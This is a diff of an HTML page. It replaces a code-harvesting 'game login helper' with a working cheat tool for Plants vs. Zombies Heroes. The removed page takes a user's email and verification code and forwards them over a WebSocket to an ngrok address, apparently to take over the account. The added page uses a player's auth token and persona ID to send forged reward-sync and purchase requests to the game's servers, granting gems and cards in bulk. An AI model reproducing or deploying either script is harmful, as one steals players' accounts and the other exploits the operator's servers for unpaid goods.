@@ -1,63 +1,183 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>游戏登录助手</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PVZ-CX 网页发包版</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center}
-.box{background:#1e293b;padding:30px;border-radius:16px;width:100%;max-width:400px;color:#fff}
-.title{font-size:22px;text-align:center;margin-bottom:20px}
-.status{padding:12px;border-radius:8px;text-align:center;margin-bottom:16px;font-weight:500}
-.waiting{background:#7c7000;color:#fffa}
-.using{background:#006500;color:#fffa}
-.disconnect{background:#650000;color:#fffa}
-.time{text-align:center;margin-bottom:10px;color:#ccc}
-.tip-box{padding:10px;background:#0f172a;border-radius:6px;font-size:14px;color:#94a3b8;text-align:center;margin-bottom:16px}
-input{width:100%;padding:12px;border-radius:8px;border:none;margin-bottom:10px;background:#334155;color:#fff}
-button{width:100%;padding:12px;border-radius:8px;border:none;background:#4f46e5;color:white;font-weight:bold;cursor:pointer;margin-bottom:10px}
-button:disabled{background:#475569;cursor:not-allowed}
-.log{margin-top:16px;padding:10px;background:#0f172a;border-radius:6px;font-size:13px;color:#ccc}
-.btn-row{display:flex;gap:10px;margin-bottom:10px}
-.btn-row button{flex:1;margin-bottom:0}
-.edit-btn{background:#64748b}
+*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui, -apple-system, sans-serif}
+body{background:#1a1a1e;color:#e0e0e0;padding:20px;max-width:600px;margin:0 auto}
+.box{background:#24242c;border-radius:10px;padding:15px;margin:10px 0}
+.title{color:#ffd700;text-align:center;margin:10px 0;font-size:18px}
+.line{height:1px;background:#b366ff;margin:10px 0}
+input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:none;background:#333;color:#fff}
+button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:6px;background:#7c3aed;color:#fff;font-weight:bold;cursor:pointer}
+button:disabled{background:#444;color:#999;cursor:not-allowed}
+.tip{color:#0fdf8f;font-size:14px;margin-bottom:8px}
+.log{background:#111;padding:10px;border-radius:6px;margin-top:10px;font-size:12px;line-height:1.4;color:#ccc}
+.success{color:#0f0}
+.error{color:#f33}
 </style>
 </head>
 <body>
+
 <div class="box">
-  <div class="title">游戏登录助手</div>
-  <div class="status disconnect" id="status">未连接</div>
-  <div class="time" id="timer"></div>
-  <div class="tip-box" id="tipText">提交邮箱后，请到邮箱查看验证码邮件，并填入下方输入框</div>
-  <input type="text" id="email" placeholder="邮箱">
-  <div class="btn-row">
-    <button id="btnEmail" disabled>提交邮箱</button>
-    <button class="edit-btn" id="editEmail" disabled>修改</button>
-  </div>
-  <input type="text" id="code" placeholder="验证码">
-  <div class="btn-row">
-    <button id="btnCode" disabled>提交验证码</button>
-    <button class="edit-btn" id="editCode" disabled>修改</button>
-  </div>
-  <div class="log" id="log"></div>
+<div class="title">远程公告</div>
+<div class="line"></div>
+<div>PVZ-CX工具 - 作者朵朵</div>
+<div>仅供学习交流，请勿倒卖</div>
+<div class="line"></div>
 </div>
+
+<div class="box">
+<div class="title">账号配置</div>
+<input type="text" id="token" placeholder="EADP-AUTH-TOKEN">
+<input type="text" id="personaId" placeholder="EADP-PERSONA-ID">
+</div>
+
+<div class="box">
+<div class="title">功能菜单</div>
+
+<div class="tip">💎 刷钻石：1次 = 10000钻石</div>
+<input type="number" id="repeat" value="1" min="1" placeholder="输入刷钻石次数">
+<button id="btn1" onclick="shuaZuanShi()">开始刷钻石</button>
+
+<div class="tip">🃏 刷卡数量：上限 1000000</div>
+<input type="number" id="cardCount" value="999999" min="1" max="1000000" placeholder="输入刷卡数量">
+<button id="btn2" onclick="shuaKaPai()">刷全卡</button>
+
+<button id="btn3" onclick="tuichu()">退出</button>
+
+<div id="log" class="log"></div>
+</div>
+
 <script>
-const WS_URL = "wss://draw-residence-scrutiny.ngrok-free.dev";
-let ws, heartbeatTimer, timerCount, timeLeft = 300;
-let emailSubmitted = false, codeSubmitted = false;
-function status(txt, cls){document.getElementById('status').innerText=txt;document.getElementById('status').className='status '+cls;}
-function log(txt){document.getElementById('log').innerText=txt;}
-function setTip(txt){document.getElementById('tipText').innerText=txt;}
-function startTimer(){clearInterval(timerCount);timeLeft=300;timerCount=setInterval(()=>{timeLeft--;let m=Math.floor(timeLeft/60),s=timeLeft%60;document.getElementById('timer').innerText=`剩余时间：${m}分${s}秒`;if(timeLeft<=0){clearInterval(timerCount);timerCount=null;status("已超时，请刷新","waiting");}},1000);}
-function sendHeart(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:"heartbeat"}));}
-function sendEmail(){const btnEmail=document.getElementById('btnEmail');const v=document.getElementById('email').value.trim();if(!v||btnEmail.disabled)return;ws.send(JSON.stringify({type:"email",content:v}));log("✅ 提交成功！");emailSubmitted=true;btnEmail.textContent="已提交";btnEmail.disabled=true;document.getElementById('email').readOnly=true;document.getElementById('editEmail').disabled=false;document.getElementById('btnCode').disabled=false;setTip("✅ 已发送验证码邮件！请到邮箱查看后填入下方「验证码」输入框");}
-function resetEmail(){const btnEmail=document.getElementById('btnEmail');emailSubmitted=false;btnEmail.textContent="提交邮箱";btnEmail.disabled=false;document.getElementById('email').readOnly=false;document.getElementById('editEmail').disabled=true;document.getElementById('btnCode').disabled=true;document.getElementById('code').value="";resetCode();setTip("提交邮箱后，请到邮箱查看验证码邮件，并填入下方输入框");}
-function sendCode(){const btnCode=document.getElementById('btnCode');const v=document.getElementById('code').value.trim();if(!v||btnCode.disabled)return;ws.send(JSON.stringify({type:"code",content:v}));log("验证码已提交");codeSubmitted=true;btnCode.textContent="已提交";btnCode.disabled=true;document.getElementById('code').readOnly=true;document.getElementById('editCode').disabled=false;setTip("✅ 验证码已提交，正在处理你的请求，请十分钟后上游戏查看");}
-function resetCode(){const btnCode=document.getElementById('btnCode');codeSubmitted=false;btnCode.textContent="提交验证码";btnCode.disabled=false;document.getElementById('code').readOnly=false;document.getElementById('editCode').disabled=true;}
-function connect(){status("正在连接...","disconnect");log("连接中");ws=new WebSocket(WS_URL);ws.onopen=()=>{status("已连接，查询状态...","waiting");log("连接成功");heartbeatTimer=setInterval(sendHeart,1000);};ws.onmessage=(e)=>{const d=JSON.parse(e.data);if(d.status==="ok"){if(!timerCount)startTimer();status("✅ 正在使用（5分钟）","using");if(!emailSubmitted)document.getElementById('btnEmail').disabled=false;}else if(d.status==="waiting"){status(`⌛ 排队中 | 前面有${d.queue}人`,"waiting");log("等待上一位结束...");document.getElementById('btnEmail').disabled=true;document.getElementById('btnCode').disabled=true;}};ws.onclose=()=>{clearInterval(heartbeatTimer);clearInterval(timerCount);timerCount=null;status("连接断开","disconnect");log("已断开，请刷新");document.getElementById('btnEmail').disabled=true;document.getElementById('btnCode').disabled=true;};}
-document.getElementById('btnEmail').onclick=sendEmail;document.getElementById('editEmail').onclick=resetEmail;document.getElementById('btnCode').onclick=sendCode;document.getElementById('editCode').onclick=resetCode;
-window.onload=connect;
+let isRunning = false; // 全局运行锁
+
+function log(msg, type) {
+  const el = document.getElementById('log');
+  const t = new Date().toLocaleTimeString();
+  const color = type === 'success' ? 'success' : type === 'error' ? 'error' : '';
+  el.innerHTML += `[${t}] <span class="${color}">${msg}</span><br>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// 禁用所有按钮
+function disableAll() {
+  document.getElementById('btn1').disabled = true;
+  document.getElementById('btn2').disabled = true;
+  document.getElementById('btn3').disabled = true;
+}
+
+// 恢复所有按钮
+function enableAll() {
+  document.getElementById('btn1').disabled = false;
+  document.getElementById('btn2').disabled = false;
+  document.getElementById('btn3').disabled = false;
+}
+
+// 刷钻石
+async function shuaZuanShi() {
+  if (isRunning) return;
+  isRunning = true;
+  disableAll();
+
+  const token = document.getElementById('token').value.trim();
+  const pid = document.getElementById('personaId').value.trim();
+  let repeat = parseInt(document.getElementById('repeat').value) || 1;
+  if (!token || !pid) {
+    log('请填写TOKEN和PersonaID', 'error');
+    isRunning = false; enableAll(); return;
+  }
+  if (repeat < 1) repeat = 1;
+  log(`开始刷钻石 → 共${repeat}次，1次=1万钻石`);
+
+  const headersBase = {
+    'Content-Type': 'application/json',
+    'EADP-AUTH-TOKEN': token,
+    'EADP-PERSONA-ID': pid,
+    'X-EADP-Client-Id': 'pvzheroes-2015-google-client',
+    'X-Pvzh-Platform': 'Android',
+    'X-Pvzh-Content-Version': '45a337051e72592e53c9bf8a4b590639',
+    'X-Pvzh-Client-Version': '1.64.6'
+  };
+
+  for (let i=1; i<=repeat; i++) {
+    try {
+      const utc = Date.now();
+      const headers = { ...headersBase, 'X-Pvzh-UTC': utc };
+      await fetch(`https://pvz-heroes.awspopcap.com/updateDailyLoginProgress?userId=${pid}`, {
+        method: 'POST', headers,
+        body: '{"day":1,"forStreak":true,"currentStreakSetCompleted":false}'
+      });
+      await new Promise(r=>setTimeout(r,300));
+
+      const res = await fetch(`https://pvz-heroes.awspopcap.com/pvp/v1/leagueRewards/sync?playerId=${pid}`, {
+        method: 'POST', headers,
+        body: '{"tickets":0,"gems":10000,"sparks":0,"packs":[],"specificCards":[]}'
+      });
+      log(`第${i}次完成 → 状态：${res.status}`);
+      await new Promise(r=>setTimeout(r,300));
+    } catch(e) {
+      log(`第${i}次失败：${e.message}`, 'error');
+    }
+  }
+
+  log('✅ 钻石任务全部完成', 'success');
+  isRunning = false; enableAll();
+}
+
+// 刷全卡
+async function shuaKaPai() {
+  if (isRunning) return;
+  isRunning = true;
+  disableAll();
+
+  const token = document.getElementById('token').value.trim();
+  const pid = document.getElementById('personaId').value.trim();
+  let count = parseInt(document.getElementById('cardCount').value) || 999999;
+  if (!token || !pid) {
+    log('请填写TOKEN和PersonaID', 'error');
+    isRunning = false; enableAll(); return;
+  }
+  if (count < 1) count = 1;
+  if (count > 1000000) count = 1000000;
+  log(`开始刷全卡 → 数量：${count}`);
+
+  const cards = {"1":count,"2":count,"3":count,"4":count,"6":count,"8":count,"15":count,"18":count,"21":count,"24":count,"29":count,"31":count,"32":count,"33":count,"39":count,"43":count,"46":count,"49":count,"53":count,"54":count,"57":count,"58":count,"59":count,"61":count,"64":count,"65":count,"66":count,"70":count,"71":count,"76":count,"78":count,"79":count,"80":count,"81":count,"82":count,"83":count,"84":count,"87":count,"88":count,"90":count,"91":count,"94":count,"95":count,"97":count,"98":count,"99":count,"101":count,"102":count,"103":count,"104":count,"105":count,"106":count,"108":count,"109":count,"110":count,"111":count,"115":count,"116":count,"117":count,"118":count,"119":count,"120":count,"122":count,"123":count,"124":count,"125":count,"126":count,"127":count,"128":count,"129":count,"130":count,"132":count,"134":count,"138":count,"139":count,"140":count,"141":count,"142":count,"143":count,"145":count,"148":count,"150":count,"151":count,"152":count,"153":count,"154":count,"156":count,"157":count,"158":count,"159":count,"160":count,"161":count,"163":count,"164":count,"165":count,"167":count,"169":count,"170":count,"171":count,"174":count,"175":count,"176":count,"178":count,"180":count,"181":count,"182":count,"186":count,"187":count,"190":count,"191":count,"193":count,"194":count,"195":count,"196":count,"197":count,"198":count,"199":count,"201":count,"202":count,"203":count,"204":count,"206":count,"207":count,"209":count,"213":count,"214":count,"215":count,"216":count,"217":count,"218":count,"220":count,"221":count,"222":count,"225":count,"226":count,"227":count,"228":count,"230":count,"231":count,"234":count,"235":count,"237":count,"238":count,"240":count,"241":count,"242":count,"243":count,"247":count,"248":count,"249":count,"251":count,"252":count,"253":count,"255":count,"256":count,"257":count,"281":count,"282":count,"284":count,"285":count,"286":count,"293":count,"294":count,"296":count,"297":count,"298":count,"299":count,"300":count,"304":count,"306":count,"307":count,"308":count,"309":count,"310":count,"312":count,"313":count,"314":count,"315":count,"316":count,"317":count,"322":count,"323":count,"324":count,"327":count,"328":count,"330":count,"332":count,"333":count,"334":count,"339":count,"340":count,"342":count,"344":count,"346":count,"353":count,"398":count,"399":count,"401":count,"402":count,"403":count,"404":count,"405":count,"406":count,"407":count,"408":count,"409":count,"410":count,"411":count,"413":count,"414":count,"415":count,"416":count,"417":count,"418":count,"419":count,"420":count,"421":count,"422":count,"423":count,"424":count,"425":count,"426":count,"427":count,"428":count,"429":count,"430":count,"431":count,"432":count,"433":count,"434":count,"435":count,"436":count,"437":count,"438":count,"439":count,"440":count,"441":count,"442":count,"443":count,"444":count,"445":count,"446":count,"447":count,"448":count,"449":count,"450":count,"451":count,"452":count,"453":count,"454":count,"455":count,"456":count,"457":count,"458":count,"459":count,"461":count,"462":count,"463":count,"464":count,"465":count,"466":count,"467":count,"468":count,"469":count,"470":count,"471":count,"472":count,"473":count,"474":count,"476":count,"477":count,"478":count,"479":count,"480":count,"481":count,"482":count,"483":count,"484":count,"485":count,"486":count,"487":count,"488":count,"489":count,"490":count,"491":count,"492":count,"493":count,"494":count,"495":count,"496":count,"497":count,"498":count,"499":count,"500":count,"501":count,"502":count,"503":count,"504":count,"505":count,"506":count,"507":count,"508":count,"510":count,"511":count,"512":count,"513":count,"514":count,"515":count,"516":count,"517":count,"518":count,"519":count,"520":count,"521":count,"524":count,"525":count,"526":count,"527":count,"528":count,"529":count,"530":count,"531":count,"532":count,"533":count,"534":count,"535":count,"536":count,"537":count,"538":count,"539":count,"540":count,"541":count,"542":count,"543":count,"544":count,"545":count,"546":count,"547":count,"548":count,"549":count,"550":count,"551":count,"552":count,"553":count,"554":count,"555":count,"556":count,"557":count,"558":count,"560":count,"566":count,"568":count,"569":count,"585":count,"586":count,"587":count,"588":count,"589":count,"591":count,"594":count,"595":count,"596":count,"597":count,"598":count,"599":count,"600":count,"601":count,"602":count,"603":count,"604":count,"605":count,"606":count,"607":count,"608":count,"609":count,"610":count,"611":count,"612":count,"613":count,"614":count,"616":count,"617":count,"618":count,"619":count,"620":count,"621":count,"622":count,"623":count,"624":count,"625":count,"626":count,"627":count,"628":count,"629":count,"630":count,"631":count,"632":count,"633":count,"634":count,"635":count,"636":count,"637":count,"638":count,"639":count,"640":count,"641":count,"642":count,"643":count,"645":count,"646":count,"647":count,"648":count,"649":count,"650":count,"651":count,"653":count,"655":count,"656":count,"657":count,"658":count,"659":count,"660":count,"661":count,"662":count,"663":count,"664":count,"665":count,"666":count,"667":count,"669":count,"670":count,"671":count,"672":count,"673":count,"674":count,"675":count,"676":count,"677":count,"678":count,"679":count,"680":count,"681":count,"682":count,"683":count,"684":count,"685":count,"686":count,"687":count,"688":count,"691":count};
+
+  const payload = JSON.stringify({
+    Sku: "deckRecipe", EventId: null, Cards: cards, ExpectedCost: 10, KeyName: "default"
+  });
+
+  const headers = {
+    'Content-Type': 'application/json',
+    'EADP-AUTH-TOKEN': token,
+    'EADP-PERSONA-ID': pid,
+    'X-EADP-Client-Id': 'pvzheroes-2015-google-client',
+    'X-Pvzh-Platform': 'Android',
+    'X-Pvzh-Content-Version': '45a337051e72592e53c9bf8a4b590639',
+    'X-Pvzh-Client-Version': '1.64.6',
+    'X-Pvzh-UTC': Date.now()
+  };
+
+  try {
+    const res = await fetch('https://pvz-heroes.awspopcap.com/persistence/v2/inventory/commitSoftPurchase', {
+      method: 'POST', headers, body: payload
+    });
+    log(`刷全卡完成 → 状态：${res.status}`, res.ok?'success':'error');
+  } catch(e) {
+    log('刷全卡失败：'+e.message, 'error');
+  }
+
+  isRunning = false; enableAll();
+}
+
+// 退出
+function tuichu() {
+  log('已退出，按钮已解锁', 'success');
+  isRunning = false; enableAll();
+}
 </script>
 </body>
 </html>
